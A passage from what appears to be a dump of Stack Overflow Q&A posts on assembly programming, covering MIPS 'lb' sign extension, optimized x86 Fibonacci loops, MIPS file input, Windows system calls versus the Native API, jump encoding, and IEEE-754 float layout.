<p>After this, you probably want <code>add esp, 8</code> (I like to write it as <code>add esp, 4 * 2</code> - two parameters of 4 bytes each). It is possible to ""defer"" this stack cleanup - <code>mov esp, ebp</code> will fix you up, but it needs to be done BEFORE the <code>pop ebp</code>!!!</p>

<p>... there may be more...</p>
","14216531"
"What exactly does the lb instruction do?","9339","","<p>I have an exam coming up, and one of the practice problems was:</p>

<blockquote>
  <p>Assume that <code>$t0</code> contains the value <code>0x12121212</code> and <code>$t1</code> contains
  the address <code>0x1000000</code>.</p>
  
  <p>Assume that the memory data, starting from address <code>0x1000000</code> is:
  <code>88 77 66 55</code>.</p>
  
  <p>What will be the value of <code>$t0</code> after the following code is executed:</p>

<pre><code>lb $t0, 0($t1)
</code></pre>
  
  <p>a) <code>0x00000088</code> b) <code>0x88121212</code> c) <code>0xffffff88</code> d) <code>0x12121288</code></p>
</blockquote>

<p>The answer I gave was <code>a</code>, because the byte that the <code>lb</code> instruction will read (by my understanding of what the instruction does) is 88. The 88 will then be stored in <code>$t0</code>, thus the value will be <code>0x00000088</code>. But the answer given was <code>c</code>. I feel like I have a fundamental misunderstanding about how <code>lb</code> works - can someone please explain why the answer is <code>c</code>?</p>
","<p>The answer would be <code>c) 0xffffff88</code>. The <code>lb</code> instructions sign-extends the byte into a 32-bit value. I.e. the most significant bit (msb) is copied into the upper 24 bits.</p>

<p>0x88 == 0b10001000, i.e. the msb is 1. So the upper 24 bits will be 0b111111111111111111111111 == 0xffffff.</p>
","14836530"
"Assembly Language (x86): How to create a loop to calculate Fibonacci sequence","9335","","<p>I am programming assembly language (x86) in MASM using Visual Studio 2013 Ultimate. I am trying to use an array to calculate a Fibonacci sequence for n elements using an array. In other words, I am trying to go to an array element, obtain the two elements before it, add those up, and store the result in another array. </p>

<p>I am having trouble setting up the index registers to make this work.</p>

<p>I have my program setup like this:</p>

<pre><code>TITLE fibonacci.asm

INCLUDE Irvine32.inc

.data
    fibInitial  BYTE 0, 1, 2, 3, 4, 5, 6
    fibComputed BYTE 5 DUP(0)

.code
main PROC

    MOVZX si, fibInitial
    MOVZX di, fibComputed
    MOV   cl, LENGTHOF fibInitial

L1:
    MOV   ax, [si - 1]
    MOV   dx, [si - 2]
    MOV   bp, ax + dx
    MOV   dl, TYPE fibInitial
    MOVZX si, dl
    MOV   [edi], bp
    MOV   dh, TYPE fibComputed
    MOVZX di, dl
    loop L1

exit
main ENDP
END main
</code></pre>

<p>I cannot compile this because of an error message that says ""error A2031: must be index or base register"" for the line <code>MOV ebp, ax + dx</code>. However, I'm certain that there are other logic errors I am overlooking.</p>
","<p>related: Code-golf print the first 1000 digits of Fib(10**9):  <a href=""https://codegolf.stackexchange.com/a/135618/30206"">my x86 asm answer</a> using an extended-precision <code>adc</code> loop, and converting binary to strings.  The inner loop is optimized for speed, other parts for size.</p>

<hr>

<p>Computing a <a href=""https://en.wikipedia.org/wiki/Fibonacci_number"" rel=""nofollow noreferrer"">Fibonacci sequence</a> only requires keeping two pieces of state: the current and previous element.  I have no idea what you're trying to do with <code>fibInitial</code>, other than counting its length.  This isn't perl where you do <code>for $n (0..5)</code>.</p>

<p>I know you're just learning asm at all, but I'm still going to talk about performance.  There's not much reason to learn asm <a href=""http://agner.org/optimize/"" rel=""nofollow noreferrer"">without knowing what's fast and what's not</a>.  If you don't need performance, let a compiler make the asm for you, from C sources.  Also see the other links at <a href=""https://stackoverflow.com/tags/x86/info"">https://stackoverflow.com/tags/x86/info</a></p>

<p>Using registers for your state simplifies the problem of needing to look at <code>a[-1]</code> while calculating <code>a[1]</code>.  You start with <code>curr=1</code>, <code>prev=0</code>, and start with <code>a[0] = curr</code>.  To produce the ""modern"" starting-with-zero sequence of <a href=""https://en.wikipedia.org/wiki/Fibonacci_number"" rel=""nofollow noreferrer"">Fibonacci numbers</a>, start with <code>curr=0</code>, <code>prev=1</code>.</p>

<p>Lucky for you, I was just thinking about an efficient loop for fibonacci code recently, so I took the time to write up a complete function.  See below for an unrolled and a vectorized version (saves on store instructions, but also makes 64bit ints fast even when compiling for a 32bit CPU):</p>

<pre><code>; fib.asm
;void fib(int32_t *dest, uint32_t count);
; not-unrolled version.  See below for a version which avoids all the mov instructions
global fib
fib:
    ; 64bit SysV register-call ABI:
    ; args: rdi: output buffer pointer.  esi: count  (and you can assume the upper32 are zeroed, so using rsi is safe)

    ;; locals:  rsi: endp
    ;; eax: current   edx: prev
    ;; ecx: tmp
    ;; all of these are caller-saved in the SysV ABI, like r8-r11
    ;; so we can use them without push/pop to save/restore them.
    ;; The Windows ABI is different.

    test   esi, esi       ; test a reg against itself instead of cmp esi, 0
    jz     .early_out     ; count == 0.  

    mov    eax, 1         ; current = 1
    xor    edx, edx       ; prev    = 0

    lea    rsi, [rdi + rsi * 4]  ; endp = &amp;out[count];  // loop-end pointer
    ;; lea is very useful for combining add, shift, and non-destructive operation
    ;; this is equivalent to shl rsi, 4  /  add rsi, rdi

align 16
.loop:                    ; do {
    mov    [rdi], eax     ;   *buf = current
    add    rdi, 4         ;   buf++

    lea    ecx, [rax + rdx] ; tmp = curr+prev = next_cur
    mov    edx,  eax      ; prev = curr
    mov    eax,  ecx      ; curr=tmp
 ;; see below for an unrolled version that doesn't need any reg-&gt;reg mov instructions

    ; you might think this would be faster:
    ; add  edx, eax    ; but it isn't
    ; xchg eax, edx    ; This is as slow as 3 mov instructions, but we only needed 2 thanks to using lea

    cmp    rdi, rsi       ; } while(buf &lt; endp);
    jb    .loop           ; jump if (rdi BELOW rsi).  unsigned compare
    ;; the LOOP instruction is very slow, avoid it

.early_out:
    ret
</code></pre>

<p>An alternate loop condition could be</p>

<pre><code>    dec     esi         ; often you'd use ecx for counts, but we had it in esi
    jnz     .loop
</code></pre>

<p>AMD CPUs can fuse cmp/branch, but not dec/branch.  Intel CPUs can also <a href=""https://stackoverflow.com/a/31778403/224132"">macro-fuse</a> <code>dec/jnz</code>.  (Or signed less than zero / greater than zero).  <code>dec/inc</code> don't update the Carry flag, so you can't use them with above/below unsigned <code>ja/jb</code>.  I think the idea is that you could do an <code>adc</code> (add with carry) in a loop, using <code>inc/dec</code> for the loop counter to not disturb the carry flag, but <a href=""https://stackoverflow.com/a/32087095/224132"">partial-flags slowdowns make this bad on modern CPUs</a>.</p>

<p><code>lea  ecx, [eax + edx]</code> needs an extra byte (address-size prefix), which is why I used a 32bit dest and a 64bit address.  (Those are the default operand sizes for <code>lea</code> in 64bit mode).  No direct impact on speed, just indirect through code size.</p>

<p>An alternate loop body could be:</p>

<pre><code>    mov  ecx, eax      ; tmp=curr.  This stays true after every iteration
.loop:

    mov  [rdi], ecx
    add  ecx, edx      ; tmp+=prev  ;; shorter encoding than lea
    mov  edx, eax      ; prev=curr
    mov  eax, ecx      ; curr=tmp
</code></pre>

<p>Unrolling the loop to do more iterations would mean less shuffling.  Instead of <code>mov</code> instructions, you just keep track of which register is holding which variable.  i.e. you handle assignments with a sort of register renaming.</p>

<pre><code>.loop:     ;; on entry:       ; curr:eax  prev:edx
    mov  [rdi], eax             ; store curr
    add  edx, eax             ; curr:edx  prev:eax
.oddentry:
    mov  [rdi + 4], edx         ; store curr
    add  eax, edx             ; curr:eax  prev:edx

    ;; we're back to our starting state, so we can loop
    add  rdi, 8
    cmp  rdi, rsi
    jb   .loop
</code></pre>

<p>The thing with unrolling is that you need to clean up any odd iterations that are left over.  Power-of-two unroll factors can make the cleanup loop slightly easier, but adding 12 isn't any faster than adding 16.  (See the previous revision of this post for a silly unroll-by-3 version using <code>lea</code> to produce <code>curr + prev</code> in a 3rd register, because I failed to realize that you don't actually need a temp.  Thanks to rcgldr for catching that.)</p>

<p>See below for a complete working unrolled version which handles any count.</p>

<hr>

<p>Test frontend (new in this version: a canary element to detect asm bugs writing past the end of the buffer.)</p>

<pre><code>// fib-main.c
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;

void fib(uint32_t *buf, uint32_t count);

int main(int argc, const char *argv[]) {
    uint32_t count = 15;
    if (argc &gt; 1) {
        count = atoi(argv[1]);
    }
    uint32_t buf[count+1]; // allocated on the stack
    // Fib overflows uint32 at count = 48, so it's not like a lot of space is useful

    buf[count] = 0xdeadbeefUL;
    // uint32_t count = sizeof(buf)/sizeof(buf[0]);
    fib(buf, count);
    for (uint32_t i ; i &lt; count ; i++){
        printf(""%u "", buf[i]);
    }
    putchar('\n');

    if (buf[count] != 0xdeadbeefUL) {
        printf(""fib wrote past the end of buf: sentinel = %x\n"", buf[count]);
    }
}
</code></pre>

<hr>

<p>This code is fully working and tested (unless I missed copying a change in my local file back into the answer >.&lt;):</p>

<pre><code>peter@tesla:~/src/SO$ yasm -f elf64 fib.asm &amp;&amp; gcc -std=gnu11 -g -Og fib-main.c fib.o
peter@tesla:~/src/SO$ ./a.out 48
1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309 3524578 5702887 9227465 14930352 24157817 39088169 63245986 102334155 165580141 267914296 433494437 701408733 1134903170 1836311903 2971215073 512559680 
</code></pre>

<hr>

<h3>unrolled version</h3>

<p>Thanks again to rcgldr for getting me thinking about how to handle odd vs. even count in the loop setup, rather than with a cleanup iteration at the end.</p>

<p>I went for branchless setup code, which adds 4 * count%2 to the starting pointer.  That can be zero, but adding zero is cheaper than branching to see if we should or not.  The Fibonacci sequence overflows a register very quickly, so keeping the prologue code tight and efficient is important, not just the code inside the loop.  (If we're optimizing at all, we'd want to optimize for many calls with short length).</p>

<pre><code>    ; 64bit SysV register-call ABI
    ; args: rdi: output buffer pointer.  rsi: count

    ;; locals:  rsi: endp
    ;; eax: current   edx: prev
    ;; ecx: tmp
    ;; all of these are caller-saved in the SysV ABI, like r8-r11
    ;; so we can use them without push/pop to save/restore them.
    ;; The Windows ABI is different.

;void fib(int32_t *dest, uint32_t count);  // unrolled version
global fib
fib:
    cmp    esi, 1
    jb     .early_out       ; count below 1  (i.e. count==0, since it's unsigned)

    mov    eax, 1           ; current = 1
    mov    [rdi], eax
    je     .early_out       ; count == 1, flags still set from cmp
    ;; need this 2nd early-out because the loop always does 2 iterations

;;; branchless handling of odd counts:
;;;   always do buf[0]=1, then start the loop from 0 or 1
;;; Writing to an address you just wrote to is very cheap
;;; mov/lea is about as cheap as best-case for branching (correctly-predicted test/jcc for count%2==0)
;;; and saves probably one unconditional jump that would be needed either in the odd or even branch

    mov    edx, esi         ;; we could save this mov by using esi for prev, and loading the end pointer into a different reg
    and    edx, eax         ; prev = count &amp; 1 = count%2

    lea    rsi, [rdi + rsi*4] ; end pointer: same regardless of starting at 0 or 1

    lea    rdi, [rdi + rdx*4] ; buf += count%2
    ;; even count: loop starts at buf[0], with curr=1, prev=0
    ;; odd  count: loop starts at buf[1], with curr=1, prev=1

align 16  ;; the rest of this func is just *slightly* longer than 16B, so there's a lot of padding.  Tempting to omit this alignment for CPUs with a loop buffer.
.loop:                      ;; do {
    mov    [rdi], eax       ;;   *buf = current
             ; on loop entry: curr:eax  prev:edx
    add   edx, eax          ; curr:edx  prev:eax

;.oddentry: ; unused, we used a branchless sequence to handle odd counts
    mov   [rdi+4], edx
    add   eax, edx          ; curr:eax  prev:edx
                            ;; back to our starting arrangement
    add    rdi, 8           ;;   buf++
    cmp    rdi, rsi         ;; } while(buf &lt; endp);
    jb    .loop

;   dec   esi   ;  set up for this version with sub esi, edx; instead of lea
;   jnz   .loop
.early_out:
    ret
</code></pre>

<p>To produce the starting-with-zero sequence, do</p>

<pre><code>curr=count&amp;1;   // and esi, 1
buf += curr;    // lea [rdi], [rdi + rsi*4]
prev= 1 ^ curr; // xor eax, esi
</code></pre>

<p>instead of the current</p>

<pre><code>curr = 1;
prev = count &amp; 1;
buf += count &amp; 1;
</code></pre>

<p>We can also save a <code>mov</code> instruction in both versions by using <code>esi</code> to hold <code>prev</code>, now that <code>prev</code> depends on <code>count</code>.</p>

<pre><code>  ;; loop prologue for sequence starting with 1 1 2 3
  ;; (using different regs and optimized for size by using fewer immediates)
    mov    eax, 1               ; current = 1
    cmp    esi, eax
    jb     .early_out           ; count below 1
    mov    [rdi], eax
    je     .early_out           ; count == 1, flags still set from cmp

    lea    rdx, [rdi + rsi*4]   ; endp
    and    esi, eax             ; prev = count &amp; 1
    lea    rdi, [rdi + rsi*4]   ; buf += count &amp; 1
  ;; eax:curr esi:prev    rdx:endp  rdi:buf
  ;; end of old code

  ;; loop prologue for sequence starting with 0 1 1 2
    cmp    esi, 1
    jb     .early_out           ; count below 1, no stores
    mov    [rdi], 0             ; store first element
    je     .early_out           ; count == 1, flags still set from cmp

    lea    rdx, [rdi + rsi*4]   ; endp
    mov    eax, 1               ; prev = 1
    and    esi, eax             ; curr = count&amp;1
    lea    rdi, [rdi + rsi*4]   ; buf += count&amp;1
    xor    eax, esi             ; prev = 1^curr
    ;; ESI:curr EAX:prev  (opposite of other setup)
  ;;
</code></pre>

<hr>

<pre><code>  ;; optimized for code size, NOT speed.  Prob. could be smaller, esp. if we want to keep the loop start aligned, and jump between before and after it.
  ;; most of the savings are from avoiding mov reg, imm32,
  ;; and from counting down the loop counter, instead of checking an end-pointer.
  ;; loop prologue for sequence starting with 0 1 1 2
    xor    edx, edx
    cmp    esi, 1
    jb     .early_out         ; count below 1, no stores
    mov    [rdi], edx         ; store first element
    je     .early_out         ; count == 1, flags still set from cmp

    xor    eax, eax  ; movzx after setcc would be faster, but one more byte
    shr    esi, 1             ; two counts per iteration, divide by two
  ;; shift sets CF = the last bit shifted out
    setc   al                 ; curr =   count&amp;1
    setnc  dl                 ; prev = !(count&amp;1)

    lea    rdi, [rdi + rax*4] ; buf+= count&amp;1

  ;; extra uop or partial register stall internally when reading eax after writing al, on Intel (except P4 &amp; silvermont)
  ;; EAX:curr EDX:prev  (same as 1 1 2 setup)
  ;; even count: loop starts at buf[0], with curr=0, prev=1
  ;; odd  count: loop starts at buf[1], with curr=1, prev=0

  .loop:
       ...
    dec  esi                  ; 1B smaller than 64b cmp, needs count/2 in esi
    jnz .loop
  .early_out:
    ret
</code></pre>

<hr>

<h3>vectorized:</h3>

<p>The Fibonacci sequence isn't particularly parallelizable.  There's no simple way to get F(i+4) from F(i) and F(i-4), or anything like that.  What we <em>can</em> do with vectors is fewer stores to memory.  Start with:</p>

<pre><code>a = [f3 f2 f1 f0 ]   -&gt; store this to buf
b = [f2 f1 f0 f-1]
</code></pre>

<p>Then <code>a+=b;  b+=a;  a+=b;  b+=a;</code> produces:</p>

<pre><code>a = [f7 f6 f5 f4 ]   -&gt; store this to buf
b = [f6 f5 f4 f3 ]
</code></pre>

<p>This is less silly when working with two 64bit ints packed into a 128b vector.  Even in 32bit code, you can use SSE to do 64bit integer math.</p>

<p>A previous version of this answer has an unfinished packed-32bit vector version that doesn't properly handle <code>count%4 != 0</code>.  To load the first 4 values of the sequence, I used <code>pmovzxbd</code> so I didn't need 16B of data when I could use only 4B.  Getting the first -1 .. 1 values of the sequence into vector registers is a lot easier, because there's only one non-zero value to load and shuffle around.</p>

<pre><code>;void fib64_sse(uint64_t *dest, uint32_t count);
; using SSE for fewer but larger stores, and for 64bit integers even in 32bit mode
global fib64_sse
fib64_sse:
    mov eax, 1
    movd    xmm1, eax               ; xmm1 = [0 1] = [f0 f-1]
    pshufd  xmm0, xmm1, 11001111b   ; xmm0 = [1 0] = [f1 f0]

    sub esi, 2
    jae .entry  ; make the common case faster with fewer branches
    ;; could put the handling for count==0 and count==1 right here, with its own ret

    jmp .cleanup
align 16
.loop:                          ; do {
    paddq   xmm0, xmm1          ; xmm0 = [ f3 f2 ]
.entry:
    ;; xmm1: [ f0 f-1 ]         ; on initial entry, count already decremented by 2
    ;; xmm0: [ f1 f0  ]
    paddq   xmm1, xmm0          ; xmm1 = [ f4 f3 ]  (or [ f2 f1 ] on first iter)
    movdqu  [rdi], xmm0         ; store 2nd last compute result, ready for cleanup of odd count
        add     rdi, 16         ;   buf += 2
    sub esi, 2
        jae   .loop             ; } while((count-=2) &gt;= 0);
    .cleanup:
    ;; esi &lt;= 0 : -2 on the count=0 special case, otherwise -1 or 0

    ;; xmm1: [ f_rc   f_rc-1 ]  ; rc = count Rounded down to even: count &amp; ~1
    ;; xmm0: [ f_rc+1 f_rc   ]  ; f(rc+1) is the value we need to store if count was odd
    cmp esi, -1
    jne   .out  ; this could be a test on the Parity flag, with no extra cmp, if we wanted to be really hard to read and need a big comment explaining the logic
    ;; xmm1 = [f1 f0]
    movhps  [rdi], xmm1         ; store the high 64b of xmm0.  There is no integer version of this insn, but that doesn't matter
    .out:
        ret
</code></pre>

<p>No point unrolling this further, the dep chain latency limits throughput, so we can always average storing one element per cycle.  Reducing the loop overhead in uops can help for hyperthreading, but that's pretty minor.</p>

<p>As you can see, handling all the corner cases even when unrolling by two is quite complex to keep track of.  It requires extra startup overhead, even when you're trying to optimize that to keep it to a minimum.  It's easy to end up with a lot of conditional branches.</p>

<p>updated main:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdlib.h&gt;

#ifdef USE32
void fib(uint32_t *buf, uint32_t count);
typedef uint32_t buftype_t;
#define FMTx PRIx32
#define FMTu PRIu32
#define FIB_FN fib
#define CANARY 0xdeadbeefUL
#else
void fib64_sse(uint64_t *buf, uint32_t count);
typedef uint64_t buftype_t;
#define FMTx PRIx64
#define FMTu PRIu64
#define FIB_FN fib64_sse
#define CANARY 0xdeadbeefdeadc0deULL
#endif

#define xstr(s) str(s)
#define str(s) #s

int main(int argc, const char *argv[]) {
    uint32_t count = 15;
    if (argc &gt; 1) {
        count = atoi(argv[1]);
    }
    int benchmark = argc &gt; 2;

    buftype_t buf[count+1]; // allocated on the stack
    // Fib overflows uint32 at count = 48, so it's not like a lot of space is useful

    buf[count] = CANARY;
    // uint32_t count = sizeof(buf)/sizeof(buf[0]);
    if (benchmark) {
    int64_t reps = 1000000000 / count;
    for (int i=0 ; i&lt;=reps ; i++)
        FIB_FN(buf, count);

    } else {
    FIB_FN(buf, count);
    for (uint32_t i ; i &lt; count ; i++){
        printf(""%"" FMTu "" "", buf[i]);
    }
    putchar('\n');
    }
    if (buf[count] != CANARY) {
        printf(xstr(FIB_FN) "" wrote past the end of buf: sentinel = %"" FMTx ""\n"", buf[count]);
    }
}
</code></pre>

<hr>

<h3>Performance</h3>

<p>For count just below 8192, the unrolled-by-two non-vector version runs near its theoretical-max throughput of 1 store per cycle (3.5 instructions per cycle), on my Sandybridge i5.  8192 * 4B/int = 32768 = L1 cache size.  In practice, I see ~3.3 to ~3.4 insn / cycle.  I'm counting the entire program with Linux <code>perf</code>, though, not just the tight loop.</p>

<p>Anyway, there's not really any point unrolling further.  And obviously this stopped being a Fibonacci sequence after count=47, since we use uint32_t.  However, for large <code>count</code>, the throughput is limited by memory bandwidth, down to ~2.6 insn / cycle.  At this point we're basically looking at how to optimize memset.</p>

<p>The 64bit vector version runs at 3 insns per cycle (one 128b store per two clocks) up to an array size of about 1.5 times L2 cache size.  (i.e. <code>./fib64 49152</code>).  As the array size goes up to larger fractions of L3 cache size, performance decreases down to ~2 insn per cycle (one store per 3 clocks) at 3/4 of L3 cache size.  It levels out to 1 store per 6 cycles at sizes > L3 cache.</p>

<p>So storing with vectors does better when we fit in L2 but not L1 cache.</p>
","32661389"
"reading the file name from user input in MIPS assembly","9323","","<p>I'm writing a MIPS assembly code that will ask the user for the file name and it will produce some statistics about the content of the file.</p>

<p>However, when I hard code the file name into a variable from the beginning it works just fine, but when I ask the user to input the file name it does not work.</p>

<p>after some debugging, I have discovered that the program adds 0x00 char and 0x0a char (check asciitable.com) at the end of user input in the memory and that's why it does not open the file based on the user input.</p>

<p>anyone has any idea about how to get rid of those extra chars, or how to open the file after getting its name from the user??</p>

<p>here is my complete code (it is working fine except for the file name from user thing, and anybody is free to use it for any purpose he/she wants to):</p>

<pre><code>        .data
fin:   .ascii """"      # filename for input
msg0:   .asciiz ""aaaa""
msg1:   .asciiz ""Please enter the input file name:""
msg2:   .asciiz ""Number of Uppercase Char: ""
msg3:   .asciiz ""Number of Lowercase Char: ""
msg4:   .asciiz ""Number of Decimal Char:   ""
msg5:   .asciiz ""Number of Words:          ""
nline:  .asciiz ""\n""
buffer: .asciiz """"
        .text

#-----------------------
    li $v0, 4
    la $a0, msg1
    syscall

    li $v0, 8
    la $a0, fin
    li $a1, 21
    syscall

    jal fileRead            #read from file

    move $s1, $v0           #$t0 = total number of bytes

    li $t0, 0   # Loop counter
    li $t1, 0   # Uppercase counter
    li $t2, 0   # Lowercase counter
    li $t3, 0   # Decimal counter
    li $t4, 0   # Words counter

loop:
    bge $t0, $s1, end           #if end of file reached OR if there is an error in the file
    lb $t5, buffer($t0)         #load next byte from file

    jal checkUpper              #check for upper case
    jal checkLower              #check for lower case
    jal checkDecimal            #check for decimal
    jal checkWord               #check for words


    addi $t0, $t0, 1            #increment loop counter

j loop

end:

    jal output
    jal fileClose

    li $v0, 10
    syscall







fileRead:
    # Open file for reading
    li   $v0, 13       # system call for open file
    la   $a0, fin      # input file name
    li   $a1, 0        # flag for reading
    li   $a2, 0        # mode is ignored
    syscall            # open a file 
    move $s0, $v0      # save the file descriptor 

    # reading from file just opened
    li   $v0, 14       # system call for reading from file
    move $a0, $s0      # file descriptor 
    la   $a1, buffer   # address of buffer from which to read
    li   $a2, 100000   # hardcoded buffer length
    syscall            # read from file

jr $ra

output:
    li $v0, 4
    la $a0, msg2
    syscall

    li $v0, 1
    move $a0, $t1
    syscall

    li $v0, 4
    la $a0, nline
    syscall

    li $v0, 4
    la $a0, msg3
    syscall

    li $v0, 1
    move $a0, $t2
    syscall

    li $v0, 4
    la $a0, nline
    syscall

    li $v0, 4
    la $a0, msg4
    syscall

    li $v0, 1
    move $a0, $t3
    syscall

    li $v0, 4
    la $a0, nline
    syscall

    li $v0, 4
    la $a0, msg5
    syscall

    addi $t4, $t4, 1
    li $v0, 1
    move $a0, $t4
    syscall

jr $ra

checkUpper:
    blt $t5, 0x41, L1           #branch if less than 'A'
    bgt $t5, 0x5a, L1           #branch if greater than 'Z'
    addi $t1, $t1, 1            #increment Uppercase counter

    L1:
jr $ra

checkLower:
    blt $t5, 0x61, L2           #branch if less than 'a'
    bgt $t5, 0x7a, L2           #branch if greater than 'z'
    addi $t2, $t2, 1            #increment Lowercase counter

    L2:
jr $ra

checkDecimal:
    blt $t5, 0x30, L3           #branch if less than '0'
    bgt $t5, 0x39, L3           #branch if greater than '9'
    addi $t3, $t3, 1            #increment Decimal counter

    L3:
jr $ra

checkWord:
    bne $t5, 0x20, L4           #branch if 'space'
    addi $t4, $t4, 1            #increment words counter

    L4:
jr $ra

fileClose:
    # Close the file 
    li   $v0, 16       # system call for close file
    move $a0, $s0      # file descriptor to close
    syscall            # close file
jr $ra
</code></pre>

<p>Note: I'm using MARS Simulator, if that makes any different</p>

<p>Update:
I have solved the problem by writing and calling the following procedure:
<code><pre>
nameClean:
    li $t0, 0       #loop counter
    li $t1, 21      #loop end
clean:
    beq $t0, $t1, L5
    lb $t3, fin($t0)
    bne $t3, 0x0a, L6
    sb $zero, fin($t0)
    L6:
    addi $t0, $t0, 1
j clean
L5:
jr $ra
</code></pre></p>
","<p>Character 10 (0xa) is the Ascii code for linefeed, which many *nix operating systems use for line terminator.  It should not be part of the filename.  Just strip it off.  Also, such operating systems use 0 for a string terminator.  It should be at the end of the filename unless the open call takes a <em>number of characters</em> parameter.</p>

<p>The solution is to take the user's reply, find character 10 and replace it with zero.  Use the result as the filename to open.</p>
","2575894"
"System Calls in windows & Native API?","9310","","<p>Recently I've been using lot of Assembly language in *NIX operating systems. I was wondering about the windows domain.</p>

<hr>

<p><strong>Calling convention in linux:</strong></p>

<pre><code>mov $SYS_Call_NUM, %eax
mov $param1 , %ebx
mov $param2 , %ecx
int $0x80
</code></pre>

<p>Thats it. That is how we should make a system call in linux. </p>

<p><strong>Reference of all system calls in linux:</strong></p>

<p>Regarding which $SYS_Call_NUM &amp; which parameters we can use this reference : <a href=""http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html"" rel=""noreferrer"">http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html</a></p>

<p>OFFICIAL Reference : <a href=""http://kernel.org/doc/man-pages/online/dir_section_2.html"" rel=""noreferrer"">http://kernel.org/doc/man-pages/online/dir_section_2.html</a></p>

<hr>

<p><strong>Calling convention in Windows:</strong></p>

<p>???</p>

<p><strong>Reference of all system calls in Windows:</strong></p>

<p>???</p>

<p>Unofficial : <a href=""http://www.metasploit.com/users/opcode/syscalls.html"" rel=""noreferrer"">http://www.metasploit.com/users/opcode/syscalls.html</a> , but how do I use these in assembly unless I know the calling convention.</p>

<p>OFFICIAL : ???</p>

<ul>
<li>If you say, they didn't documented it. Then how is one going to write libc for windows without knowing system calls? How is one gonna do Windows Assembly programming? Atleast in the driver programming one needs to know these. right?</li>
</ul>

<hr>

<p>Now, whats up with the so called Native API? Is <code>Native API</code> &amp; <code>System calls for windows</code> both are different terms referring to same thing? In order to confirm I compared these from two UNOFFICIAL Sources</p>

<p>System Calls: <a href=""http://www.metasploit.com/users/opcode/syscalls.html"" rel=""noreferrer"">http://www.metasploit.com/users/opcode/syscalls.html</a></p>

<p>Native API: <a href=""http://undocumented.ntinternals.net/aindex.html"" rel=""noreferrer"">http://undocumented.ntinternals.net/aindex.html</a></p>

<p>My observations:</p>

<ol>
<li>All system calls are beginning with letters <code>Nt</code> where as Native API is consisting of lot of functions which are not beginning with letters <code>Nt</code>.</li>
<li><code>System Call of windows</code> are subset of <code>Native API</code>. System calls are just part of Native API. </li>
</ol>

<p>Can any one confirm this and explain.</p>

<p><strong>EDIT:</strong></p>

<p>There was another answer. It was a 2nd answer. I really liked it but I don't know why answerer has deleted it. I request him to repost his answer.</p>
","<p>If you're doing assembly programming under Windows you don't do manual syscalls. You use NTDLL and the Native API to do that for you.</p>

<p>The Native API is simply a wrapper around the kernelmode side of things. All it does is perform a syscall for the correct API.</p>

<p>You should NEVER need to manually syscall so your entire question is redundant.</p>

<p>Linux syscall codes do not change, Windows's do, that's why you need to work through an extra abstraction layer (aka NTDLL).</p>

<p>EDIT:</p>

<p>Also, even if you're working at the assembly level, you still have full access to the Win32 API, there's no reason to be using the NT API to begin with! Imports, exports, etc all work just fine in assembly programs.</p>

<p>EDIT2:</p>

<p>If you REALLY want to do manual syscalls, you're going to need to reverse NTDLL for each relevant Windows version, add version detection (via the PEB), and perform a syscall lookup for each call.</p>

<p>However, that would be silly. NTDLL is there for a reason.</p>
","2489975"
"Relative vs Absolute jmp in Assembly","9296","","<p>I was wondering about the following. I've noticed when writing assembly language that IA32 is designed in such a way as to promote the use of relative jumps i.e. jump a displacement amount of bytes vs the use of absolute jumps i.e. change eip to a specific address in memory. What is the logic behind this?</p>
","<p>Most jumps are to targets not far away from the jump instruction. Since jump instructions are provided that take a signed 16-bit value, they can be fewer bytes than needed for an absolute jump (usually 4 bytes plus the instruction itself).</p>

<p>One small additional advantage of relative branches is that they don't need to be fixed up in the linker, or, for that matter, go through the extra indirection needed in PIC (position independent code).</p>
","4697960"
"Converting Int to Float/Float to Int using Bitwise","9290","","<p>I was wondering if you could help explain the process on converting an integer to float, or a float to an integer. For my class, we are to do this using only bitwise operators, but I think a firm understanding on the casting from type to type will help me more in this stage. </p>

<p>From what I know so far, for int to float, you will have to convert the integer into binary, normalize the value of the integer by finding the significand, exponent, and fraction, and then output the value in float from there?</p>

<p>As for float to int, you will have to separate the value into the significand, exponent, and fraction, and then reverse the instructions above to get an int value? </p>

<p>I tried to follow the instructions from this question: <a href=""https://stackoverflow.com/questions/12342926/casting-float-to-int-bitwise-in-c"">Casting float to int (bitwise) in C</a> </p>

<p>But I was not really able to understand it. </p>

<p>Also, could someone explain why rounding will be necessary for values greater than 23 bits when converting int to float? </p>

<p>Thanks in advance</p>
","<p>First, a paper you should consider reading, if you want to understand floating point foibles better:  ""What Every Computer Scientist Should Know About Floating Point Arithmetic,"" <a href=""http://www.validlab.com/goldberg/paper.pdf"" rel=""nofollow noreferrer"">http://www.validlab.com/goldberg/paper.pdf</a></p>

<p>And now to some meat.</p>

<p>The following code is bare bones, and attempts to produce an IEEE-754 single precision float from an <code>unsigned int</code> in the range 0 &lt; value &lt; 2<sup>24</sup>.  That's the format you're most likely to encounter on modern hardware, and it's the format you seem to reference in your original question.</p>

<p>IEEE-754 single-precision floats are divided into three fields:  A single sign bit, 8 bits of exponent, and 23 bits of significand (sometimes called a mantissa).  IEEE-754 uses a <em>hidden 1</em> significand, meaning that the significand is actually 24 bits total.  The bits are packed left to right, with the sign bit in bit 31, exponent in bits 30 .. 23, and the significand in bits 22 .. 0.  The following diagram from Wikipedia illustrates:</p>

<p><img src=""https://upload.wikimedia.org/wikipedia/commons/thumb/d/d2/Float_example.svg/590px-Float_example.svg.png"" alt=""floating point format""></p>

<p>The exponent has a bias of 127, meaning that the actual exponent associated with the floating point number is 127 less than the value stored in the exponent field.  An exponent of 0 therefore would be encoded as 127.</p>

<p>(Note:  The full Wikipedia article may be interesting to you.  Ref: <a href=""http://en.wikipedia.org/wiki/Single_precision_floating-point_format"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Single_precision_floating-point_format</a> )</p>

<p>Therefore, the IEEE-754 number 0x40000000 is interpreted as follows:</p>

<ul>
<li>Bit 31 = 0:  Positive value</li>
<li>Bits 30 .. 23 = 0x80:  Exponent = 128 - 127 = 1 (aka. 2<sup>1</sup>)</li>
<li>Bits 22 .. 0 are all 0:  Significand = 1.00000000_00000000_0000000.  (Note I restored the hidden 1).</li>
</ul>

